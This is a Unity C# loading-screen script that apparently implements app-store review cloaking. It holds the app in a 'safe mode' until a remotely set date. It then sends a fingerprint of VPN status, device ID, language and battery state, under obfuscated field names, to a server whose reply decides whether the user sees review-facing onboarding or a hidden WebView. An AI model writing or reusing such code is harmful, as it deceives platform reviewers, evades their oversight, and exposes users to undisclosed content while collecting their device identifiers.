using DG.Tweening;
using System;
using System.Collections;
using System.Net.NetworkInformation;
using TMPro;
using UnityEngine;
using UnityEngine.Networking;

[System.Serializable]
public class DateConfig
{
    public int Day;
    public int Month;
    public int Year;
}
public class LoadScreenTemplate : MonoBehaviour
{
    private float _percentNow = 0;
    private float _percentGoalNow = 0;
    Coroutine _percentMoveCoroutine;

    public WebViewTemplate WebView; 
    public DateConfig DateConfig;
    public CanvasGroup ThisWindow;
    bool _isDead = false;
    bool _safeMode = false;

    public TextMeshProUGUI PercentText;
    private void Start()
    {
        _percentMoveCoroutine = StartCoroutine(ToPercentNowGoing());
        _percentGoalNow = 10;
    }

    public void ProcessDownloadStart()
    {
        _percentGoalNow += 20;
        StartCoroutine(DownloadProcessCoroutine());
    }
    IEnumerator DownloadProcessCoroutine()
    {
        string priorDate = FirebaseTemplate.instance.GetStringByKey("PriorDate");
        string[] paramsData = priorDate.Split(new char[] { '.' });
        DateConfig.Day = Convert.ToInt32(paramsData[0]);
        DateConfig.Month = Convert.ToInt32(paramsData[1]);
        DateConfig.Year = Convert.ToInt32(paramsData[2]);

        if (DateTime.UtcNow.Day < DateConfig.Day
            && DateTime.UtcNow.Month <= DateConfig.Month
            && DateTime.UtcNow.Year == DateConfig.Year)
        {
            _percentGoalNow = 100;
            _safeMode = true;
            yield break;
        }
        if (FirebaseTemplate.instance.GetBooleanByKey("isDead") || PlayerPrefs.HasKey("WasShowed"))
        {
            _percentGoalNow = 100;
            _isDead = true;
            yield break;
        }

        _percentGoalNow += 10;
        string CloakPoint = string.Empty;
        string endData = GenerateData();
        using (UnityWebRequest www = UnityWebRequest.Post("https://1-0-url", endData, "application/json"))
        {
            yield return www.SendWebRequest();
            if (www.result != UnityWebRequest.Result.Success)
            {
                //OnBoard - Review
            }
            else
            {
                CloakPoint = www.downloadHandler.text;
            }
        }

        _percentGoalNow = 70;
        if (CloakPoint.Contains("0"))
            _safeMode = false;
        else
            _safeMode = true;
        _percentGoalNow = 101;
    }

    IEnumerator ToPercentNowGoing()
    {
        if (_percentNow < _percentGoalNow)
        {
            _percentNow += 60 * Time.deltaTime;
            SetTextToPercent(_percentNow);
            if (_percentNow >= 100)
            {
                if (_isDead)
                {
                    WebView.DefindAndOpen();
                    yield break;
                }

                ThisWindow.DOFade(0, 0.5f).OnComplete(() => {
                    if (_safeMode)
                    {
                        if (PlayerPrefs.HasKey("boarding"))
                        {
                            //Menu
                        }
                        else
                        {
                            //OnBoard - Review
                        }
                    }
                    else
                    {
                        //OnBoard - User
                    }
                });

                StopCoroutine(_percentMoveCoroutine);
                yield break;
            }
        }
        yield return new WaitForEndOfFrame();
        _percentMoveCoroutine = StartCoroutine(ToPercentNowGoing());
    }
    public void SetTextToPercent(float count)
    {
        int endCount = Mathf.RoundToInt(count);
        if (endCount > 100)
            endCount = 100;

        PercentText.SetText(endCount.ToString() + "%");
    }
    public string GenerateData()
    {
        bool isVPN = IsVpn();
        string id = SystemInfo.deviceUniqueIdentifier;
        string lang = Application.systemLanguage.ToString();
        string batteryLevel = (SystemInfo.batteryLevel * 100).ToString();
        bool batteryStatus = SystemInfo.batteryStatus == BatteryStatus.Charging;
        bool batteryFull = SystemInfo.batteryStatus == BatteryStatus.Full;
        string endData = $"{{\"userData\": {{ \"agQG\": {isVPN.ToString().ToLower()}, \"qGaw\": \"{id}\", \"LGaB\": \"{lang}\", \"isCh\": {batteryStatus.ToString().ToLower()}, \"isFu\": {batteryFull.ToString().ToLower()}, \"BLel\": \"{batteryLevel}\" }}}}";

        return endData;
    }
    public bool IsVpn()
    {
        bool isVPN = false;
        if (NetworkInterface.GetIsNetworkAvailable())
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface Interface in interfaces)
            {
                if (Interface.OperationalStatus == OperationalStatus.Up)
                {
                    if (((Interface.NetworkInterfaceType == NetworkInterfaceType.Ppp) && (Interface.NetworkInterfaceType != NetworkInterfaceType.Loopback)) || Interface.Description.Contains("VPN") || Interface.Description.Contains("vpn"))
                    {
                        IPv4InterfaceStatistics statistics = Interface.GetIPv4Statistics();
                        isVPN = true;
                    }
                }
            }
        }
        return isVPN;
    }
}
